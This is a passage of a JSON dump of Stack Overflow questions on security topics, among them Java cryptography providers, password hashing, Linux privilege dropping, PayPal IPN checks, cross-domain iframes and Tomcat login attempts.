location</p>\n\n<p>supposing that I use the standard LAMP stack (also I use Zend Framework)</p>\n"},{"tags":["java","security","cryptography","jce"],"answer_count":1,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":12544,"score":3,"question_id":3711754,"title":"Why java.security.NoSuchProviderException No such provider: BC?","body":"<p>The jar (bcprov-jdk16-145.jar) has been added to the project, <code>Security.addProvider(new org.bouncycastle.jce.provider.BouncyCastleProvider())</code> has been added to the class, and <code>BouncyCastleProvider.PROVIDER_NAME</code> does return \"BC\" but AesFileIo.writeFile() still throws <code>java.security.NoSuchProviderException No such provider: BC</code>. Any ideas?</p>\n\n<pre><code>import java.io.FileOutputStream;\nimport java.io.InputStreamReader;\nimport java.io.ObjectOutputStream;\nimport javax.crypto.Cipher;\nimport javax.crypto.spec.IvParameterSpec;\nimport javax.crypto.spec.SecretKeySpec;\nimport org.bouncycastle.jce.provider.BouncyCastleProvider;\n\npublic class AesFileIo {\n\n    private static final String AES_ALGORITHM = \"AES/CTR/NoPadding\";\n    private static final String PROVIDER = BouncyCastleProvider.PROVIDER_NAME;\n    private static final byte[] AES_KEY_128 = { // Hard coded for now\n        78, -90, 42, 70, -5, 20, -114, 103,\n        -99, -25, 76, 95, -85, 94, 57, 54};\n    private static final byte[] IV = { // Hard coded for now\n        -85, -67, -5, 88, 28, 49, 49, 85,\n        114, 83, -40, 119, -65, 91, 76, 108};\n    private static final SecretKeySpec secretKeySpec =\n            new SecretKeySpec(AES_KEY_128, \"AES\");\n    private static final IvParameterSpec ivSpec = new IvParameterSpec(IV);\n\n    public void AesFileIo() {\n        Security.addProvider(new org.bouncycastle.jce.provider\n                .BouncyCastleProvider());\n    }\n\n    public void writeFile(String fileName, String theFile) {\n        try {\n            Cipher cipher = Cipher.getInstance(AES_ALGORITHM, PROVIDER);\n            cipher.init(Cipher.ENCRYPT_MODE, secretKeySpec, ivSpec);\n            byte[] encrypted = cipher.doFinal(theFile.getBytes());\n            ObjectOutputStream os = new ObjectOutputStream(\n                new FileOutputStream(fileName));\n            os.write(encrypted);\n            os.flush();\n            os.close();\n        } catch (Exception e) {\n            StackTraceElement se = new Exception().getStackTrace()[0];\n            System.err.println(se.getFileName() + \" \" + se.getLineNumber()\n                    + \" \" + e);\n        }\n    }\n}\n</code></pre>\n"},{"tags":["security","hash","passwords"],"answer_count":3,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":67,"score":2,"question_id":12108068,"title":"What hashing algorithm should I use for storing passwords?","body":"<p>I'm not really up to date with the most recent developments regarding hashing algorithms strengths; what is currently my best bet for storing passwords?</p>\n\n<p>Also, how much more security do salting and key stretching offer me?</p>\n"},{"tags":["linux","security","root"],"answer_count":2,"favorite_count":0,"up_vote_count":13,"down_vote_count":0,"view_count":215,"score":13,"question_id":12287327,"title":"permanently drop root privileges on modern Linux","body":"<p>After start up I'd like my Linux program to drop root privileges and switch to a non-privileged account.  I've found various examples online but nothing canonical for my requirements, specifically:</p>\n\n<ol>\n<li>this is a permanent drop</li>\n<li>both (e)uid and (e)gid should switch to non-root</li>\n<li>only Linux support (kernel > 2.6.32)</li>\n<li>no need for supplemental groups</li>\n</ol>\n\n<p>The best approach I've found is:</p>\n\n<pre><code>uid_t new_uid = ...;\ngid_t new_gid = ...;\n\ngid_t rgid, egid, sgid;\nif (setresgid(new_gid, new_gid, new_gid) &lt; 0)\n{\n    perror(\"setresgid\");\n    exit(EXIT_FAILURE);\n}\nif (getresgid(&amp;rgid, &amp;egid, &amp;sgid) &lt; 0)\n{\n    perror(\"getresgid\");\n    exit(EXIT_FAILURE);\n}\nif (rgid != new_gid || egid != new_gid || sgid != new_gid)\n{\n    printf(\"unexpected gid\");\n    exit(EXIT_FAILURE);\n}\n\nif (setgroups(0, 0) != 0)\n{\n    perror(\"setgroups\");\n    exit(EXIT_FAILURE);\n}\n\nuid_t ruid, euid, suid;\nif (setresuid(new_uid, new_uid, new_uid) &lt; 0)\n{\n    perror(\"setresuid\");\n    exit(EXIT_FAILURE);\n}\nif (getresuid(&amp;ruid, &amp;euid, &amp;suid) &lt; 0)\n{\n    perror(\"getresuid\");\n    exit(EXIT_FAILURE);\n}\nif (ruid != new_uid || euid != new_uid || suid != new_uid)\n{\n    printf(\"unexpected uid\");\n    exit(EXIT_FAILURE);\n}\n</code></pre>\n\n<p>I can wrap this in an exe and demonstrate that the uid's and gid's appear correct using:</p>\n\n<pre><code>ps -eO user,uid,ruid,suid,group,gid,rgid,sgid\n</code></pre>\n\n<p>The program can't bind to a privileged port or manipulate most root-owned files, so that's all good.</p>\n\n<p>I've also found the <a href=\"http://linux.die.net/man/8/captest\">captest</a> program (included in libcap-ng-utils) which verifies that the process does not have any unexpected <a href=\"http://www.kernel.org/doc/man-pages/online/pages/man7/capabilities.7.html\">capabilities(7)</a>.</p>\n\n<p>However, since security is a concern I'd like to be more confident that I've dropped all non-essential privileges correctly.  How can I be certain?</p>\n\n<p>Thanks.</p>\n"},{"tags":["asp.net","security","google-chrome","session-state"],"answer_count":3,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":436,"score":3,"question_id":11692421,"title":"Google Chrome keeps session variables after browser close","body":"<p>I am using asp.net forms version 4 and using the built in FormsAuthentication.\nI have selected to not persist the User.</p>\n\n<pre><code>      FormsAuthentication.RedirectFromLoginPage(userIAmUsing, false);\n</code></pre>\n\n<p>When I close the browser in IE and Firefox. My session variables are destroyed and I am asked to re-login when I return to the page. However, in my Chrome settings I have the \"Continue where I left off\" setting checked. When I close the browser in Chrome, it is persisting the cookie against my (the developer's) wishes. In fact, even after I have logged out of my machine, the session is persisted. \nThat being the situation, does anyone know of any thing that I can do as a developer to override this behavior and not allow the session to persist after browser close? In other words, can I make Chrome behave exactly like other browsers even if the user has checked that setting?</p>\n"},{"tags":["android","security","android-sdcard","open-file"],"answer_count":1,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":107,"score":2,"question_id":12386399,"title":"Open file securely with an external Android application without copying the file onto the external storage","body":"<p>I'm doing a secure application, where an user can browse some file and open them with application presents on the phone. So for now, my application is really secure, files are well encrypted, but I have one MAJOR break. Indeed, I'm using my application to open the user secure files which are of different types (pdf, doc, txt, jpg, ...) so I'm using the external application presents on the user phone to open them. But my issue is here, because to let another application to open these files, I need to provide an Android storage location to the application that I want to use.</p>\n\n<p>Here is the code that I'm using right now:</p>\n\n<pre><code>Intent intent = new Intent();\nintent.setAction(android.content.Intent.ACTION_VIEW);\nFile fileToOpen = new File(activity.getExternalCacheDir().getAbsolutePath() + \n    \"/\" + fileName);\n\nMimeTypeMap mime = MimeTypeMap.getSingleton();\nString extension = fileToOpen.getName().substring(\n        fileToOpen.getName().lastIndexOf(\".\") + 1);\nString type = mime.getMimeTypeFromExtension(extension);\nintent.setAction(Intent.ACTION_VIEW);\n\nintent.setDataAndType(Uri.fromFile(fileToOpen), type);\n\nManager.getActivity().startActivityForResult(intent,\n        ExplorerActivity.FILE_CLOSED_SUCCESSFULLY);\n</code></pre>\n\n<p>So, as you can see in my code, I need to store my real file into the cache directory to open it, so if a thief has an access to the user phone, it can open real files presents into this directory so my application is not secure anymore.\nOf course I'm deleting this plain file right after the user has closed it and I have encrypted it, but the deletion doesn't mean that the file is totally deleted from the phone. Before deletion, I'm rewriting with some null byte but it's not enough for a secure deltion of this file.</p>\n\n<p>So now, what I want from you it's an idea to achieve what I want to do: open a file without storing it into the Android hard storage.</p>\n\n<p>Here are some leads that I had: </p>\n\n<ul>\n<li>Open the file with my own app (but it's a lot to implement because there are too many types of files, and I really don't like to develop something which exists already)</li>\n<li>Find a solution to open the file without storing it externally of my application (What I mean is to open the file directly with the byte array of this file)</li>\n<li>Store the file into the phone RAM (I don't know if it is possible)</li>\n</ul>\n\n<p>So this is a non-exhaustive list and any other suggestion will be appreciated. And if you can provide any help about one of the solution that I have proposed, please don't hesitate. Don't hesitate also to tell me if one of my ideas are completely impossible or wrong.</p>\n\n<p>Thanks in advance</p>\n"},{"tags":["security","oauth","wso2"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":128,"score":0,"question_id":12351195,"title":"WSO2 API manager security layer","body":"<p>I hope to use wso2 api manager to expose my webservices to a mobile app.I want to store an api key in the localstorage of the client and use it along with the api calls for the authentication. So how can I pass the automatically generated api key by the wso2 api manager for each web service and pass it to the client? Are there any alternatives for this?</p>\n"},{"tags":["security","api","database-design"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":46,"score":1,"question_id":12378220,"title":"API design and security: Why hide internal ids?","body":"<p>I've heard a few people say that you should never expose your internal ids to the outside world (for instance an auto_increment'ng primary key).  </p>\n\n<p>Some suggest having some sort of uuid column that you use instead for lookups.</p>\n\n<p>I'm wondering really why this would be suggested and if it's truly important.  </p>\n\n<p>Using a uuid instead is basically just obfuscating the id.  What's the point?  The only thing I can think of is that auto_incrementing integers obviously point out the ordering of my db objects.  Does it matter if an outside user knows that one thing was created before/after another?</p>\n\n<p>Or is it purely that obfuscating the ids would prevent \"guessing\" at different operations on specific objects?</p>\n\n<p>Is this even an issue I should thinking about when designing an external facing API?</p>\n"},{"tags":["java","spring","security","spring-mvc","spring-security"],"answer_count":1,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":252,"score":0,"question_id":12371770,"title":"Spring MVC - Checking if User is already logged in via Spring Security?","body":"<p>I have a Spring MVC application.<strong>It uses its own custom Login page</strong>. Upon successful login, a 'LOGGED_IN_USER' object is placed in the HTTPSession.</p>\n\n<p>I want to allow only authenticated users to access URLs. I know i can achieve this by using a web filter. But, This part i want to do using Spring Security (my check will remain the same - look for 'LOGGED_IN_USER' object in HTTPSession, if present you are logged in).</p>\n\n<p><em>My constraint is i cannot change Login behavior at present - that will not use Spring Security yet.</em></p>\n\n<p><strong>What aspect of Spring Security can i use to achieve this part alone - check if the request is authenticated (from logged in user)?</strong> </p>\n"},{"tags":["c#",".net","wcf","silverlight","security"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":2130,"score":1,"question_id":627353,"title":"Silverlight/WCF login session","body":"<p>I am working on a system with Silverlight and using WCF to call services to do all of the work on the server side.  </p>\n\n<p>I need to have a user log into the system, and once they are verified, all calls to the server need to contain the user info so the server can check security policies and do other operations based on the user.  </p>\n\n<p>What is the best way to do this?  I can create some kind of a user class and send it to the server with every call, but is there a better way to do this with Silverlight and or WCF?  </p>\n"},{"tags":["javascript","html","security","iframe","cross-domain"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":168,"score":0,"question_id":12381334,"title":"Foolproof way to detect if iframe is cross domain","body":"<p>I'm trying to determine if any iframe is cross-domain or not. According to the accepted answer in this question: <a href=\"http://stackoverflow.com/questions/2365822/detect-when-iframe-is-cross-domain-then-bust-out-of-it\">Detect when iframe is cross-domain, then bust out of it</a> it says to put the code accessing the <code>contentDocument</code> of the iframe in a <code>try / catch</code> block. I tried this for a cross-domain iframe in Chrome:</p>\n\n<pre><code>try { \n  document.getElementsByTagName('iframe')[0].contentDocument;\n} catch(err){\n  console.log(\"called\");\n}\n</code></pre>\n\n<p>and it still throws the cross-domain error and does not catch the error.</p>\n\n<p>I also tried to check if the protocol + host + port of the parent page url is in the <code>src</code> of the iframe:</p>\n\n<pre><code>function thirdPartyIframe(iframe){\n  var url = document.location.protocol + \"//\" + document.location.hostname + (document.location.port === \"\" ? \"\" : \":\" + document.location.port);\n  var regexp = new RegExp(url.replace(/\\//g, \"\\\\/\").replace(/\\./g, \"\\\\.\"));\n  if (iframe.src === '' || regexp.test(iframe.src)){\n    return false;\n  } else {\n    return true;\n  }\n}\n</code></pre>\n\n<p>but this does not seem to work for the first iframe on the homepage of Facebook with <code>src</code> equal to (it's long):</p>\n\n<pre><code>\"http://www.facebook.com/ai.php?aed=AQLlH2cfdnsnLrDUVyqrQPlWpayw9N09Z_iNuhulevbeEfVa4mcVRcT8cjAZOjQb8y1QXab5Ae3aSEJx49U_Qv35rtSp1VC9cY0_CrpOjMDk40hS_Xm57A996YtRVCcWSuRZ_jZERQ_iA_E4621NAbKHT9dsB7uElkRtTvl5K-zPI0jeH-BEnlZIOXbeEdbRC6qCwoToaltolpe-Ot2KWgkfb_vBZYpzUc3jQoEHzLG6tauO9l_hkXpYpHxnt-KYFKIFZ1PgmrHgb0UcGjeKHl7yBR1AbW2n5XgdgaAhFvBjs5GZlKy566nvl8eLRA60orwkwtWYeN8-gKoAmOLm7-6minsWn8lk1h2Qn3p07HCTSnYHfv1aJ6mF5jmuzP0YYe7Ym9ZbmK-tvax4uPAQJ2OdULilKbEh8M-2V9pVY3AC228OPlrRullZuuOg8DI2A8WeMF-fbbOdOFFVCe5Gj1CaZu3LYXiqdG7mUgY6AEpk9ZzGT4fC2K8DInQo1AypCvzG64C_bEWfODeXe0aGbkWwsUUmO7E5HFg0tvZkK5IAR_xxxQ2rlf5jbcEDo_2gdIDdHe1HT75-SJLUsSA0M8EU01oNNPuWwEC2BW6inepc9QPuqeg42tcEbKLU-rIUnXDBLvgutft8azWPPQ6_LafGjCAmC9uTalagoWLLDMpQOThvPg7YeVd7qg_c9Mzn2GAfuswcxDSxyRIZo9MaOhA6mhfXeE1tmjyBBsMxnx08tO21Jsfgch59fmMxpeJzdsNMPK3FAojfglvCQ2Zrt_6ataexUB4xlM7_PhKrfBPtxb5fe2TE9-nlWruNEpoCrzI05yv4Go3CYEWHob06K_9iICfNVTFkSYGTiJnMXCy_fdgfyzUIn5QJIPRo4-Wnyg444zKAO_nyFW59LqbIanHVfFY6ybiA6KeC3meREWzTPSsrU5d_NbYHlJWb8uPNDR04jaH5e2qiYj3Y8qgLQA5m\"\n</code></pre>\n\n<p>My function classifies it as not a third party iframe, but Chrome still throws the cross-domain error when I access its <code>contentDocument</code>.</p>\n\n<p>I'm looking for a foolproof, cross-browser way to do this.</p>\n"},{"tags":["java","security","sockets","spy"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":48,"score":0,"question_id":12366783,"title":"Spy Java Secure Sockets","body":"<p>I would like to know if there is an easy (or hard) way to spy the secure sockets from a java applet ? (without having the source code) </p>\n\n<p>The goal here is to know exactly what for informations send an (very good obfuscated) applet.</p>\n\n<p>I thought i can simply compile myself a modified java version with a log function but the full source code from java is not available for security reasons...</p>\n"},{"tags":["windows","vb.net","security","application","registration"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":54,"score":0,"question_id":12380620,"title":"Secure way to check application registration status VB.NET","body":"<p>Currently I have a VB.NET WinForm application that store user's registration info (user name, serial no) into a TripleDES encrypted file. The logic of the application is:</p>\n\n<p>[ Application Start ]\n1. Check if registration file exist.\n2. Perform a checksum to check if file has been tampered.\n3. Validate stored serial number\n4. IF validated, simply set a shared (static) boolean variable named \"isRegistered\" to TRUE.\n5. Application Runs in registered mode.</p>\n\n<p>The question: is it safe if the application's status (trial / registered) is determined ONLY during program's start up? I fear hacker could read the memory when the application is running and locate the \"isRegistered\" variable and set it to TRUE, therefore bypassing the registration system.</p>\n\n<p>An alternative way I could think of is to call a function that check registration status (read from the encrypted file) every time the program execute a task but I'm afraid that would increase the application's overhead and slow it down.</p>\n\n<p>Any idea?</p>\n\n<p>Thanks</p>\n"},{"tags":["wcf","security","https"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":31,"score":0,"question_id":12363252,"title":"Use AES in HTTPS for a WCF service","body":"<p>I have created a WCF service which is using the basicHttpBinding with security mode set to \"Transport\", binded a cert to the port. So clients are able to consume the service through https.</p>\n\n<p>Now, manager asks me to use AES128 in https, which i have no idea how. How to make that https channel encrypted by AES? Is it possible or does it even make sense?</p>\n\n<p>Johnny</p>\n"},{"tags":["php","mysql","security","connection"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":44,"score":1,"question_id":12379538,"title":"mysql and php security: database as catalog only","body":"<p>I am using a mysql database only to display information. All of the information regarding security that I can find is in regard to dynamically creating usernames and passwords, or for the purpose of user input, which does not apply here, so forgive me if I missed a duplicate.</p>\n\n<p>I am creating a separate php file for each of the following processes:</p>\n\n<ul>\n<li>config: contains the db host, username and password. this will be protected by htaccess</li>\n<li>opendb: This will login to the database</li>\n<li>closedb: This will exit the database</li>\n<li>functions: This will contain user defined functions</li>\n</ul>\n\n<p>The username permissions will be limited to select only.</p>\n\n<p>I am using prepared statements. Session start is contained within a user function.</p>\n\n<p>Is there anything I'm missing? Does this sound relatively safe? Again, all of the info in this DB is <em>NOT</em> proprietary. The website is not large.</p>\n\n<p>Please let me know if you need further information.</p>\n\n<p><strong>UPDATE</strong></p>\n\n<p>How necessary is it to use a salt?</p>\n\n<p>Also, I read somewhere that you can put this into the ini file and just call a connection function without storing username and password. Is that a better option?</p>\n"},{"tags":["java","security","ssl"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":52,"score":0,"question_id":12378790,"title":"SSL Communication Java","body":"<p>I have generated self-signed certificates for an <code>admin</code> instance of my app and a <code>judge</code> instance of my app. These instances are running on different machines and they both have copies of each others certificates and their own. I want to communicate between these two, and I am wondering whether my current approach is the correct way to do so:</p>\n\n<pre><code>CertificateFactory cf = CertificateFactory.getInstance(\"X.509\");\nCertificate certificate = cf.generateCertificate(new FileInputStream(...));\n\nKeyStore keyStore = KeyStore.getInstance(KeyStore.getDefaultType());\nkeyStore.load(null, \"test\".toCharArray());\nkeyStore.setCertificateEntry(\"admin\", certificate);\n\n// Code omitted which repeats the above to set the judge certificate\n\nTrustManagerFactory tmf = TrustManagerFactory.getInstance(TrustManagerFactory.getDefaultAlgorithm());\ntmf.init(keyStore);\nSSLContext ctx = SSLContext.getInstance(\"TLS\");\nctx.init(null, tmf.getTrustManagers(), null);\n\nfactory = ctx.getSocketFactory(); // Or #getServerSocketFactory() if admin and not judge\n</code></pre>\n\n<p>With this I will be able to securely communicate with the two instances, correct?</p>\n"},{"tags":["java","security","applet","accesscontrolexception","policyfiles"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":29,"score":0,"question_id":12374621,"title":"AccessControlException with applet classes in the same codebase","body":"<p>I have three classes, one called Capture, AppletLogging and AbstractJLabel.  I have set the following permissions in my %USERPROFILE%/.java.policy file:</p>\n\n<pre><code>grant codeBase \"file:/C:/project/abc/target/test-classes/-\" {\n  permission java.util.logging.LoggingPermission \"control\";\n};\n</code></pre>\n\n<p>All classes are in the codeBase from the grant above.  When Capture calls a static method in AppletLogging everything works ok.  When AbstractJLabel calls the same static method in AppletLogging then I get</p>\n\n<pre><code>java.security.AccessControlException: access denied (java.util.logging.LoggingPermission control)\n</code></pre>\n\n<p>This runs in the Sun java plugin version 6 update 35. Does anyone have an explanation?  I get the same error even if I all the following to the grant codeBase block:</p>\n\n<pre><code>  permission java.security.AllPermission;\n</code></pre>\n\n<p>Note that Capture and AbstractJLabel invoke the static method from a static block.</p>\n"},{"tags":["security","bash","shell","sh"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":103,"score":1,"question_id":12374240,"title":"Save password between bash script execution","body":"<p>I want my script to prompt for a password, but I only want it to do so once per <strong><del>day</del></strong> session (let's say half an hour). Is it possible to save the login credentials of a user between script executions securely? I need this to be a bash script, because it has to run on several different types of UNIX, on which I am not authorized to install anything.</p>\n\n<p>I was thinking of encrypting a text file to which I would write the login credentials, but where would I keep the password to that file? Seems like I just re-create the problem.</p>\n\n<p>I know about utilities which run an enrypted script, and I am very against using them, because I do not like the idea of keeping a master password inside a script that people might need to debug later on.</p>\n\n<p>EDIT: This is not a server logon script, but authenticates with a web server that I have no control over.</p>\n\n<p>EDIT 2: Edited session duration</p>\n"},{"tags":["javascript","facebook","security","greasemonkey","userscripts"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":121,"score":0,"question_id":10314534,"title":"How can I prevent a webpage from detecting I am running a script?","body":"<p>After experimenting with scripts on facebook.com, I noticed that for a couple of minutes it didn't allow me to connect to facebook.com. This happened more than one time so I suspect that Facebook doesn't like to mess with their code using userscripts.</p>\n\n<p>The Stack&nbsp;Overflow question <em><a href=\"http://stackoverflow.com/questions/8548141/can-a-website-know-if-i-am-running-a-userscript\">Can a website know if I am running a userscript?</a></em> answers the multiple ways a website can detect scripts.</p>\n\n<p>Now I want to know how I can fool a website to not detect any scripts I may be running.\nIs there a way to know what my userscript HTML changes trigger on the website?</p>\n"},{"tags":["c#","asp.net","mysql","security"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":60,"score":0,"question_id":12376226,"title":"Best Way to Store Password using C# and MySql","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/947618/how-to-best-store-user-information-and-user-login-and-password\">How to best store user information and user login and password</a><br>\n  <a href=\"http://stackoverflow.com/questions/1054022/best-way-to-store-password-in-database\">Best way to store password in database</a>  </p>\n</blockquote>\n\n\n\n<p>I'm looking for the best methods to securely store passwords on a web-based application using C# and MySql.</p>\n\n<p>I'd love any advice on the best way to implement this, if there are existing dll's i can tap into or things already built into the .net framework.</p>\n\n<p>Also - i'm looking for the way to best store the password while following PCI compliance rules.</p>\n\n<p>Thanks very much...\nLoren</p>\n"},{"tags":["linux","security","networking","access-token"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":22,"score":0,"question_id":12375338,"title":"Contemplating on FYP scope of project","body":"<p>I'm new here. First of all,im a security system student. I would like to ask about Wireless Router authorization methods. Ive suggested to my lecturer for password generator for router,but my lecturer insist on doing security token that initialize first communication between client and router for authorization.Sorta like Mcd authorization that doing it on the router.To be honest, I dont know how to program the system. Never done any software development before. </p>\n\n<p>The question is:</p>\n\n<ol>\n<li>How would I get the sources for creating package/software for embedded system? Like doing package for tomato/dd-wrt.</li>\n<li>I got the alternative by doing wpa2-enterprise with radius server. Any good sources to setup server platform and configuration wizard tool for client and PKI for digital certificates?</li>\n</ol>\n\n<p>Thanks. </p>\n"},{"tags":["asp.net","security","restriction","singleinstance","tabbed-browsing"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":197,"score":0,"question_id":8597208,"title":"Restrict user to a single window","body":"<p>In a project I'm working on (ASP .Net 3.5 web forms), there is a requirement to restrict the user to work in only 1 window/tab at time. I found this post detailing a solution: <a href=\"http://www.codeproject.com/KB/aspnet/MultipleTabWindows.aspx\" rel=\"nofollow\">http://www.codeproject.com/KB/aspnet/MultipleTabWindows.aspx</a></p>\n\n<p>However, in one of the pages of my project there is a requirement to open a private (related to the logged in user) pdf document in a new window. The way I'm doing it is by building a request to a page inside of my project and, from that page, stream the pdf document. So, the url of my document looks something like: <code>http://localhost:4087/PdfPage.aspx?type=1&amp;id=2</code></p>\n\n<p><strong>Q</strong>: is there a way to bypass the \"single window\" rule for only the pdf page or should I say \"No, the only way is by opening the pdf in the same window\"?</p>\n\n<p>Thanks in advance</p>\n"},{"tags":["php","security","codeigniter","paypal","ipn"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":60,"score":0,"question_id":12371833,"title":"Paypal - Securing non-encrypted buttons","body":"<p>I implemented a dynamic button \"buy now\" (not saved in my PayPal account) with IPN and it works fine (yeah!).</p>\n\n<p>Now I have a doubt about his security, because if someone change with firebug (for example) the amount value, the transaction is valid for paypal also if my IPN listener says there is a problem with amount.</p>\n\n<p>My question is \"Can I encrypt the form with a php / codeigniter library?\"</p>\n\n<p>Because I tried to check amount in the IPN listener, but the transaction on paypal continue correctly and It isn't blocked from IPN.</p>\n\n<p>Here, you find a part of my listener code:</p>\n\n<pre><code>private function isVerifiedIPN(){\n\n    $req = 'cmd=_notify-validate';\n    $posts = $this-&gt;input-&gt;post();\n    foreach ($posts as $key =&gt; $value){\n        $value = urlencode(stripslashes($value));\n        $req .= \"&amp;$key=$value\";\n    }\n\n    if($this-&gt;config-&gt;item('SIMULATION'))\n        $url = $this-&gt;config-&gt;item('SIMULATION_URL');\n    else\n        $url = $this-&gt;config-&gt;item('PRODUCTION_URL');\n\n\n    if(!$this-&gt;isVerifiedAmmount() ||\n    !$this-&gt;isPrimaryPayPalEmail() ||\n    !$this-&gt;isNotProcessed()){\n        $req = '';\n    }\n\n    $header = \"POST /cgi-bin/webscr HTTP/1.0\\r\\n\";\n    $header .= \"Host: $url\\r\\n\"; //443\n    $header .= \"Content-type: application/x-www-form-urlencoded\\r\\n\";\n    $header .= \"Content-length: \" . strlen($req) . \"\\r\\n\\r\\n\";\n\n    $fp = fsockopen (\"ssl://$url\", 443, $errno, $errstr, 30);\n\n    if (!$fp)\n    {\n        $this-&gt;sendReport(\"Errore connessione socket\");\n        return FALSE;\n    }\n    else\n    {\n        fputs ($fp, $header . $req);\n        while (!feof($fp))\n        {\n            $res = fgets ($fp, 1024);\n            if (strcmp($res, \"VERIFIED\") == 0)\n            {\n                // transizione valida\n                fclose ($fp);\n                return TRUE;\n            }\n            else if (strcmp ($res, \"INVALID\") == 0)\n            {\n                $this-&gt;sendReport('Transizione non valida');\n                fclose ($fp);\n                return FALSE;\n            }\n        }\n    }\n\n}\n</code></pre>\n"},{"tags":["android","security","android-lifecycle"],"answer_count":3,"favorite_count":3,"up_vote_count":9,"down_vote_count":0,"view_count":740,"score":9,"question_id":9822076,"title":"How do I prevent Android taking a screenshot when my app goes to the background?","body":"<p>The app I'm currently building has the requirement that the app has to prevent the OS to take a screenshot of the app when it's being pushed into the background for security reasons. This way it won't be able to see the last active screen when switching between apps.</p>\n\n<p>I'm planning to put this functionality in the application class's onPause method, but first I need to find out how I can achieve this functionality.</p>\n\n<p>So is there anybody out there, that has a clue how to fix this? </p>\n"},{"tags":["asp.net-mvc","security","authorization"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":42,"score":0,"question_id":12371294,"title":"asp mvc fine grained view permission","body":"<p>I am build ASP MVC 4 web application and I need to create fine-grained permission on my views.\nIt means I need to show some actions to some users depend on their role, the data type request and other authorization rules.</p>\n\n<p>On the controller side I put Authorize attribute where appropriate and create fine-grained code like so:</p>\n\n<pre><code>public ActionResult Index() {\n  List&lt;Survey&gt; surveys;\n  if (MyUser.IsSuperUser) {\n    surveys = surveyRep.AllSurveys.ToList();\n  }\n  else {\n    surveys = surveyRep.VisibleSurveys.ToList();\n  }\n\n  return View(surveys);\n}\n</code></pre>\n\n<p>Because I'm building multi-tenant application any user who is not super user see only the \"visible\" surveys. Super user always see everything.</p>\n\n<p>The problem now is how to create the same thing on the view side, without duplicating logic (DRY).</p>\n\n<p>Currently when a user that is not super user and has only one tenant link to it I use this razor view logic:</p>\n\n<pre><code>&lt;h2&gt;Create&lt;/h2&gt;\n\n@using (Html.BeginForm()) {\n    @Html.ValidationSummary(true)\n    &lt;fieldset&gt;\n        &lt;legend&gt;Survey&lt;/legend&gt;\n\n        @if (!MyUser.IsSingleTenant) {\n            &lt;div class=\"editor-label\"&gt;\n                Tenant\n            &lt;/div&gt;\n            &lt;div class=\"editor-field\"&gt;\n                @Html.DropDownListFor(model =&gt; model.TenantID, ...\n                @Html.ValidationMessageFor(model =&gt; model.TenantID)\n            &lt;/div&gt;\n        }\n</code></pre>\n\n<p>MyUser return the currently logged in use and IsSingleTenant indicate if she only link to single tenant.</p>\n\n<p>I'm afraid this will make my views messy with a lot of \"if-then\" logic.</p>\n\n<p>How do other people solve this?</p>\n\n<p>Thank you,\nIdo.</p>\n"},{"tags":["c#","windows","security","active-directory","windows-identity"],"answer_count":5,"favorite_count":2,"up_vote_count":1,"down_vote_count":0,"view_count":134,"score":1,"question_id":12166589,"title":"How do I get the current windows user's name in username@domain format?","body":"<p>I know that the following function returns the current Windows user's name in domain\\username format. </p>\n\n<pre><code>Convert.ToString( WindowsIdentity.GetCurrent().Name );\n</code></pre>\n\n<p>But how do I obtain the user's name in <code>username@domain</code> format?</p>\n\n<p>EDIT:</p>\n\n<p>I'm responding in this edit as everyone who has replied has the same basic idea.</p>\n\n<p>From what I've been given to understand, parsing the name from <code>domain\\username</code> format and constructing it as <code>username@domain</code> is not safe or advised.  I believe this is so because there is no guarantee that the two domain names are the same in the different formats.  For example, in the company where I work, the <code>domain</code> part of the <code>domain\\username</code> format is based upon deparment, but in the <code>username@domain</code>, it's the company name.  It's the kind of thing that requires a DNS lookup.</p>\n\n<p>I was hoping that there was an API that did this DNS lookup.  I guess I should have put this information into my original question.  Sorry.</p>\n"},{"tags":["security","tomcat"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":128,"score":0,"question_id":12367317,"title":"Tomcat 7 security - attempt to login?","body":"<p>After deploying our app on Tomcat 7 we got lots of this:</p>\n\n<pre><code>&lt;date&gt; org.apache.catalina.realm.LockOutRealm authenticate\nWARNING: An attempt was made to authenticate the locked user \"admin\"\n</code></pre>\n\n<p>and in the access log we have found <em>lots</em> of this:</p>\n\n<pre><code>91.121.4.141 - - &lt;date&gt; \"GET /manager/html HTTP/1.1\" 401 2486\n</code></pre>\n\n<p>that seems a france ISP (OVH SAS).</p>\n\n<p>So.. what's going on? Are they try to log, ping? Is it a botnet?</p>\n\n<p>How can we protect from this attempts to login?</p>\n"},{"tags":["security","firefox","browser","ssl"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":80,"score":0,"question_id":12142907,"title":"Error `sec_error_revoked_certificate` when viewed in Firefox only","body":"<p>I have an SSL certificate that does not inhibit the loading of a client's site when viewed in Chrome, Safari, or Android Browser. Unfortunately, when viewed in Firefox, I encounter the following error 